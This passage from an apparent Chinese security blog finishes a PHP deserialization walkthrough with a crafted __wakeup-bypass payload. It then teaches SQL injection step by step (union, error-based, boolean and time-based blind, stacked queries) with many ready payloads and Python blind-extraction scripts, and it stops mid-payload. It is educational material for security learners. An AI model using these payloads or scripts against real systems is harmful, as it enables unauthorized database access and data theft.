表示一个属性名，长度为14个字符，属性名是 &quot;Nameusername&quot;。</span><br><span class="line">s:5:&quot;admin&quot; 表示属性 &quot;Nameusername&quot; 的值是一个长度为5的字符串，即 &quot;admin&quot;。</span><br><span class="line">s:14:&quot;Namepassword&quot; 表示另一个属性名，长度为14个字符，属性名是 &quot;Namepassword&quot;。</span><br><span class="line">i:100; 表示属性 &quot;Namepassword&quot; 的值是一个整数，即 100</span><br></pre></td></tr></table></figure><h3 id="PHP中常用魔术方法"><a href="#PHP中常用魔术方法" class="headerlink" title="PHP中常用魔术方法"></a>PHP中常用魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__construct：当对象被创建时调用</span><br><span class="line">__destruct：当对象被销毁前调用</span><br><span class="line">__sleep：执行serialize函数前调用</span><br><span class="line">__wakeup：执行unserialize函数前调用</span><br><span class="line">__call：在对象中调用不可访问的方法时调用</span><br><span class="line">__callStatic：用静态方法调用不可访问方法时调用</span><br><span class="line">__get：获得类成因变量时调用</span><br><span class="line">__set：设置类成员变量时调用</span><br></pre></td></tr></table></figure><p>PHP中序列化后的数据中并没有像Python一样包含函数<code>__construct</code>和<code>print</code>的信息，而仅仅是类名和成员变量的信息。因此，在<code>unserialize</code>函数的参数可控的情况下，还需要代码中包含魔术方法才能利用反序列化漏洞</p><p>于是我们将参数值给select，这时候问题来了，在反序列化的时候会首先执行<code>__wakeup()</code>魔术方法，但是这个方法会把我们</p><p>的username重新赋值，所以我们要考虑的就是怎么跳过<code>__wakeup()</code>，而去执行<code>__destruct</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然而，PHP的反序列化机制存在一个逻辑检查，用于确保序列化字符串中的属性数量与实际类中定义的属性数量相匹配。如果在序列化字符串中声明的属性数量多于实际类中定义的属性数量，PHP会认为序列化数据可能不完整或者格式不正确，因此会跳过__wakeup()方法的调用。这样做是为了防止潜在的错误或者不可预测的行为，因为如果序列化数据不准确，__wakeup()方法中的代码可能会尝试访问不存在的属性，导致错误或者异常</span><br></pre></td></tr></table></figure><p><strong>处理私有属性</strong>：在PHP中，私有属性（使用<code>private</code>关键字声明）在序列化时，其类名和属性名前会被加上<code>\0</code>前缀。攻击者在构造序列化字符串时，也必须包含这些前缀，以确保私有属性被正确处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（完善中...）</title>
      <link href="/undefined/f8b7/"/>
      <url>/undefined/f8b7/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="/undefined/f8b7/1.png" alt="sql"></p><p>其实sql注入从来不只是具有单一性的，从操作来看，很多时候都是结合起来使用。所以上面这张图只是对sql注入进行一个总结，我选择把联合注入放在前面，间接性的结合其它比如说数据类型注入等来作为开头</p><h2 id="一-联合注入（有回显）"><a href="#一-联合注入（有回显）" class="headerlink" title="一.联合注入（有回显）"></a>一.联合注入（有回显）</h2><p>在进行注入之前，判断注入数据类型</p><p><strong>数字型：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1</span><br><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure><p>在sql内部语句就会转换成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id=1 and 1=1</span><br><span class="line">select * from table_name where id=1 and 1=2</span><br></pre></td></tr></table></figure><p>可见，第一个永远为真，回显肯定正常；第二个肯定不对，回显就会错误，根据这个来判断是否存在数字型注入</p><p><strong>字符型：</strong></p><p>通常的使用单引号去检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure><p>sql语句会是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这个时候最后的单引号会落单，多半会有回显提示你的语句存在语法错误，我们只需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;#</span><br></pre></td></tr></table></figure><p>加一个注释符号，把后面的单引号注释掉，这个时候如果页面有正常回显，那么说明存在字符型注入；这也就是万能密码的原理**’ or 1&#x3D;1#**；也就是说为了留一个心眼，在写sql查询时，还是要将密码和用户名分开查询，构成两个语句。</p><p><strong>搜索型：</strong></p><p>一般而言搜索型注入对应的语句是like语句，会像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username like &#x27;%$content%&#x27;</span><br></pre></td></tr></table></figure><p>一般而言我们在搜索框会这样输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quar%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure><p>我们现在来看一下sql语句变成了什么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username like &#x27;%quar%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</span><br></pre></td></tr></table></figure><p>可以看到每一个都是以’%  %’的闭合方式，所以这条sql语句就会通过</p><p>不难看出，不管注入的数据类型是啥，我们都是要去想办法通过注入点<strong>闭合</strong>这条sql语句</p><p>判断好注入类型以后我们就可以进行联合注入了，接下来就是一些常规步骤（以字符型注入为例）</p><h3 id="1-判断字段数（列数）"><a href="#1-判断字段数（列数）" class="headerlink" title="1.判断字段数（列数）"></a>1.判断字段数（列数）</h3><p><strong>union有一个十分严格的约束条件，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure><p>123….依次去试，错误的列数不会有正常回显，当有错误回显后-1既是列数</p><h3 id="2-判断回显点"><a href="#2-判断回显点" class="headerlink" title="2.判断回显点"></a>2.判断回显点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure><p>根据回显，判断哪几列字段会输出有效信息，同时验证我们order by语句是否正确</p><h3 id="3-数据库名"><a href="#3-数据库名" class="headerlink" title="3.数据库名"></a>3.数据库名</h3><p>以下都会用到group_concat()进行字符拼接</p><p>现在只需要将有回显的数字替换成这个函数即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">或</span><br><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where </span><br><span class="line">table_schema=database()#</span><br></pre></td></tr></table></figure><p><strong>如果你打开过MySQL数据库，你会发现自带几个数据库，而information_schema就是一个包含了关于 MySQL 服务器上所有其他数据库的元数据的一个库，schemata是里面的表，储存着各个数据库名信息</strong></p><h3 id="4-表名"><a href="#4-表名" class="headerlink" title="4.表名"></a>4.表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where </span><br><span class="line">table_schema=&#x27;数据库名&#x27;#</span><br></pre></td></tr></table></figure><h3 id="5-字段名"><a href="#5-字段名" class="headerlink" title="5.字段名"></a>5.字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(column_name) from information_schema.columns where </span><br><span class="line">table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;#</span><br></pre></td></tr></table></figure><h3 id="6-字段信息"><a href="#6-字段信息" class="headerlink" title="6.字段信息"></a>6.字段信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(字段1,字段2) from 表名#</span><br></pre></td></tr></table></figure><h2 id="二-报错注入（有回显）"><a href="#二-报错注入（有回显）" class="headerlink" title="二.报错注入（有回显）"></a>二.报错注入（有回显）</h2><p>其机制是人为的制造错误条件，使得查询结果出现在错误信息中<strong>（页面上没有显示位但是有sql语句执行错误信息输出位）</strong>；一般在联合查询（有回显）受限且能返回错误信息的情况下使用；在mysql5.5之后，整形溢出才会报错</p><p>报错注入原理：</p><p><img src="/undefined/f8b7/7.png" alt="image-20240305193921603"></p><p>在MySQL的官方文档中我们可以看到，无标志位的最大整形数据是2^64-1也就是18446744073709551615，当超过这个数值时就会发生整型溢出导致报错</p><p><img src="/undefined/f8b7/2.png" alt="image-20240305194448175"></p><p>在真实的注入环境中，我们可以用按位取反运算符号~</p><p><img src="/undefined/f8b7/3.png" alt="image-20240305194628430"></p><h3 id="1-主键重复"><a href="#1-主键重复" class="headerlink" title="1.主键重复"></a>1.主键重复</h3><p>这里会有三个函数count(*),group by,rand()造成重复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure><p><strong>count(*)：</strong>计算结果有多少行</p><p>**floor(rand(0)<em>2))：**首先rand(0)产生0~1随机浮点数，</em>2则是0~2随机浮点数，floor()函数向下取整，所以整体随机生成0或1</p><p><strong>group by：</strong>读取每一行数据，产生一个临时的表x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from 表名 group by NAME;</span><br></pre></td></tr></table></figure><p>这个sql语句翻译过来就是</p><p>原本的表：</p><table><thead><tr><th>ID</th><th>NAME</th></tr></thead><tbody><tr><td>0</td><td>aaa</td></tr><tr><td>1</td><td>bbb</td></tr><tr><td>2</td><td>aaa</td></tr></tbody></table><p>临时产生的表：</p><table><thead><tr><th>KEY</th><th>count(*)</th></tr></thead><tbody><tr><td>aaa</td><td>1+1</td></tr><tr><td>bbb</td><td>1</td></tr></tbody></table><p>然而，我们都知道，rand函数其实是一个伪随机，每次随机出来的数字都是一样的，所以floor(rand(0)*2)就会得到011011…的<strong>固定</strong>序列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from test group by floor(rand(0)*2)</span><br></pre></td></tr></table></figure><p>所以第一次结果为0**(第一次计算)<strong>，查询虚表，</strong><em>发现没有该键值，则尝试插入该键值</em><strong>，再二次运算，将结果1</strong>(第二次计算)<strong>插入虚表；结果1</strong>(第三次计算)<strong>，查询有该键值，则插入；结果0</strong>(第四次计算)<strong>，</strong><em>查询没有该键值，则尝试插入该键值</em><strong>，进行二次运算结果为1</strong>(第五次计算)**，此时键值重复，则报错</p><p><img src="/undefined/f8b7/4.png" alt="image-20240305205607603"></p><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</span><br></pre></td></tr></table></figure><p>表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</span><br></pre></td></tr></table></figure><p>字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</span><br></pre></td></tr></table></figure><p>字段数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</span><br></pre></td></tr></table></figure><p>这里的x，a是临时的表名</p><h3 id="2-xpath语法错误"><a href="#2-xpath语法错误" class="headerlink" title="2.xpath语法错误"></a>2.xpath语法错误</h3><p>XML查询和修改的函数，extractvalue和updatexml；extractvalue负责在XML文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(xml_document, xpath_string)</span><br><span class="line">xml_document:XML 文档的标识符(xml文档对象的名称)</span><br><span class="line">xpath_string:XPath 表达式(字符串)</span><br></pre></td></tr></table></figure><p>如果 XPath 表达式格式错误，MySQL 会抛出一个错误，数据库会记录错误信息，并返回错误信息，而我们就可以把payload构造在XPath表达式中</p><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))#</span><br></pre></td></tr></table></figure><p><strong>1：</strong>作为文档标识符，这里应该是占位的作用，理论上这里可以写入任何数据</p><p><strong>0x7e：</strong>16进制的表示方法，这里是’~’，而这个符号在XPath 表达式中是一个非法字符，所以就会报错</p><p>表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e)))#</span><br></pre></td></tr></table></figure><p>字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e)))#</span><br></pre></td></tr></table></figure><p>字段数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME),0x7e)))#</span><br></pre></td></tr></table></figure><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(xml_document, xpath_string, new_value)</span><br><span class="line">xml_document：  XML 文档的标识符</span><br><span class="line">xpath_string ：用于指定要更新的节点</span><br><span class="line">new_value：新值</span><br></pre></td></tr></table></figure><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))#</span><br></pre></td></tr></table></figure><p>表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e))#</span><br></pre></td></tr></table></figure><p>字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;表名&#x27;)),0x7e))#</span><br></pre></td></tr></table></figure><p>字段数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))#</span><br></pre></td></tr></table></figure><p>注意两个函数0x7e的位置，前者只是为了方便显示select的信息；后者中，两个都是非法字符，起占位的作用</p><h2 id="三-布尔盲注"><a href="#三-布尔盲注" class="headerlink" title="三.布尔盲注"></a>三.布尔盲注</h2><p>通过改变输入并观察应用程序的输出（通常是页面显示的内容或错误消息）来确定数据库中的信息，用and和or来构造sql语句</p><p>这里有三个函数length(),substr(),ascii()</p><p><strong>length()：</strong>返回字符串的长度</p><p><strong>substr()：</strong>有三个参数，第一个是要截取的字符串，第二个是从第几个字符开始截取，第三个是一次性截取多少个；例如，substr(hello,2,2)输出el</p><p><strong>ascii()：</strong>返回字符的ASCII码（用于后续二分法进行猜测比较，确定字符）</p><p>每一个阶段可分为，判断表，字段数量（count函数）；确定字符个数（length函数）；⼆分法逐字猜解（substr和ascii函数）</p><p><strong>判断数据库字符个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=1 #</span><br></pre></td></tr></table></figure><p>改变值，直至页面回显正常（这也就是为什么，在写脚本时，我们要进行抓包来判断注入成功时能返回什么信息）</p><p><strong>判断数据库字符串每个字符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),n,1))&gt;97 # a</span><br><span class="line">1&#x27; and ascii(substr(database(),n,1))&lt;122 # z</span><br><span class="line">n从1依次增加，因为前面的字符已经通过二分法确定</span><br></pre></td></tr></table></figure><p>通过观察页面来进行判断</p><p><strong>判断表有几个</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;=1 #</span><br></pre></td></tr></table></figure><p>1，2…..直至页面正常即可</p><p><strong>判断表字符个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1 #</span><br><span class="line">limit 0,1：限制第一个表，如果有第二个表limit 1,1</span><br></pre></td></tr></table></figure><p>后续的字段同理</p><h2 id="四-时间盲注"><a href="#四-时间盲注" class="headerlink" title="四.时间盲注"></a>四.时间盲注</h2><h3 id="1-sleep延时"><a href="#1-sleep延时" class="headerlink" title="1.sleep延时"></a>1.sleep延时</h3><p><strong>if()：</strong>IF(条件, 值1, 值2)，如果条件为真，则返回值1，否则返回值2</p><p><strong>sleep(n)：</strong>延迟n秒后回显</p><p>大体和布尔盲注一样：</p><p><strong>判断数据库字符个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())&gt;8,sleep(2),0) #</span><br></pre></td></tr></table></figure><p><strong>判断数据库字符串每个字符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) #</span><br></pre></td></tr></table></figure><p>后面同理了，只需用if与sleep函数组合起来</p><p>这里的重点是，当sleep函数被过滤时，我们应该怎么办？事实上，我们的目的是达到延时的效果，以下几种方法均可</p><h3 id="2-benchmark延时"><a href="#2-benchmark延时" class="headerlink" title="2.benchmark延时"></a>2.benchmark延时</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">benchmark(t,exp)</span><br><span class="line">重复执行t次exp表达式</span><br><span class="line">benchmark( 5000000, md5( &#x27;test&#x27; ))以此达到延时效果</span><br></pre></td></tr></table></figure><h3 id="3-笛卡尔积（叠加全排列）"><a href="#3-笛卡尔积（叠加全排列）" class="headerlink" title="3.笛卡尔积（叠加全排列）"></a>3.笛卡尔积（叠加全排列）</h3><p>对多个表做笛卡尔积连接，使之查询时间呈指数增长，增加系统执行sql语句的负荷，直到产生想要的时间延迟</p><p><strong>笛卡尔积连接：</strong>数据库中的一种连接类型，它发生在两个表（或查询结果集）之间，不基于任何特定的条件。在这种连接中，第一个表的每一行与第二个表的每一行组合，形成一个新的结果集，其中包含了所有可能的行对组合</p><p><img src="/undefined/f8b7/5.png" alt="image-20240307194908845"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C)可以是同一张表</span><br></pre></td></tr></table></figure><h3 id="4-GET-LOCK-加锁"><a href="#4-GET-LOCK-加锁" class="headerlink" title="4.GET_LOCK() 加锁"></a>4.GET_LOCK() 加锁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_lock(str,n)给str上锁，若成功返回1，失败返回0，并延时n秒</span><br><span class="line">release_lock(str)没有该str的锁返回NULL；释放成功返回 1，失败返回0</span><br></pre></td></tr></table></figure><p>这个锁是应用程序级别的，在不同的mysql会话之间使用，<strong>不是锁具体某个表名或字段</strong>，它是一种独占锁，意味着哪个会话持有这个锁，其他会话尝试拿这个锁的时候都会失败</p><p>当会话1 get_lock 后，未释放。会话2 不get_lock 同一个key，或者就不get_lock,依然可以对数据进行任何操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=115,get_lock(1,2),1)#</span><br><span class="line">或</span><br><span class="line">1&#x27; and get_lock(substr(database(),1,1),2);</span><br></pre></td></tr></table></figure><p><strong>使用条件：数据库必须是持久连接；所利用的是前一个连接对后一个连接的阻碍作用从而导致延时产生；php中使用mysql_pconnect()方法链接数据库的网站</strong></p><h3 id="5-RLIKE-REGEXP正则匹配"><a href="#5-RLIKE-REGEXP正则匹配" class="headerlink" title="5.RLIKE REGEXP正则匹配"></a>5.RLIKE REGEXP正则匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><p><strong>rpad(1,999999,’a’)：</strong>在字符1右边补a，直到长度为999999</p><p><strong>(a.*)：</strong>点号 <code>.</code> 在正则表达式中表示任意字符；星号 <code>*</code> 表示前面的元素可以出现零次或多次；<code>.*</code> 匹配任意长度的任意字符序列</p><p>然后通过<strong>rlike</strong>判断字符串是不是形如<strong>aaaaaab</strong>，事实上肯定不是，将返回0</p><p>如果 RLIKE 匹配成功，查询可能会因为字符串的匹配而快速返回结果，而不成功则可能会因为数据库需要更多时间来处理这个复杂的匹配而产生延时</p><h3 id="时间盲注的优缺点"><a href="#时间盲注的优缺点" class="headerlink" title="时间盲注的优缺点"></a>时间盲注的优缺点</h3><p>优点：对日志没有任何影响，日志没有记录，就加大了管理员发现的难度</p><p>缺点：执行大量查询时，管理员也会意识到发生的事情；测试Web应用程序时，服务器负载和网络速度可能对响应时间产生巨大的影响，你需要增长时间来保证结果的准确性，但同时在合理的时间内测试应用程序又会需要减少时间，因此把握好度很重要</p><h2 id="关于SQL盲注的效率分析"><a href="#关于SQL盲注的效率分析" class="headerlink" title="##关于SQL盲注的效率分析##"></a>##关于SQL盲注的效率分析##</h2><p>1.遍历法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def get_database_name(url,dictionary,zhurudian):</span><br><span class="line">    database_name = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    for num in range(1,100):</span><br><span class="line">       print(num)</span><br><span class="line">       for i in dictionary:</span><br><span class="line">         data = &#123;&#x27;username&#x27;:&quot;admin&#x27; and substr((seLect(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27; #&quot;.format(num,i),</span><br><span class="line">         &#x27;password&#x27;:&#x27;123456&#x27;&#125;</span><br><span class="line">         response = requests.post(url = url, data = data)</span><br><span class="line">        </span><br><span class="line">         if zhurudian in response.text:</span><br><span class="line">            database_name += i</span><br><span class="line">            print(database_name)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return database_name</span><br></pre></td></tr></table></figure><p>2.二分法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def get_database_name(url,dictionary,zhurudian):</span><br><span class="line">    database_name = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    for num in range(1,100):</span><br><span class="line">       print(num)</span><br><span class="line">       min = 32</span><br><span class="line">       max = 126</span><br><span class="line">       mid = (min+max) // 2 #取整</span><br><span class="line"></span><br><span class="line">       while min &lt;= max:</span><br><span class="line">           data = &#123;&#x27;username&#x27;:&quot;admin&#x27; and ascii(substr((seLect(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&gt;&#x27;&#123;1&#125;&#x27; #&quot;.format(num,mid),</span><br><span class="line">           &#x27;password&#x27;:&#x27;123456&#x27;&#125;</span><br><span class="line">           response = requests.post(url = url, data = data)</span><br><span class="line">        </span><br><span class="line">           if zhurudian in response.text: #ascii码值比mid大</span><br><span class="line">             min = mid + 1</span><br><span class="line">           else:</span><br><span class="line">             max = mid</span><br><span class="line">           mid = (min+max) // 2</span><br><span class="line">           if min == max:</span><br><span class="line">              database_name += chr(mid)</span><br><span class="line">              print(database_name)</span><br><span class="line">              break</span><br><span class="line">            </span><br><span class="line">    return database_name</span><br></pre></td></tr></table></figure><p>3.与运算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五-堆叠注入"><a href="#五-堆叠注入" class="headerlink" title="五.堆叠注入"></a>五.堆叠注入</h2><p>即同时执行多条sql语句(增，删，改)，用<strong>；</strong>进行连接，我们发现联合查询可以结合两条语句，但是union只能进行查询操作</p><p>但堆叠注入本身局限性比较大，只有遇到支持同时执行多条sql语句的数据库才可以使用；在MySQL中，只有当使用mysql_multi_query()函数才能使用，像mysqli_ query()是只支持执行一条的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;select 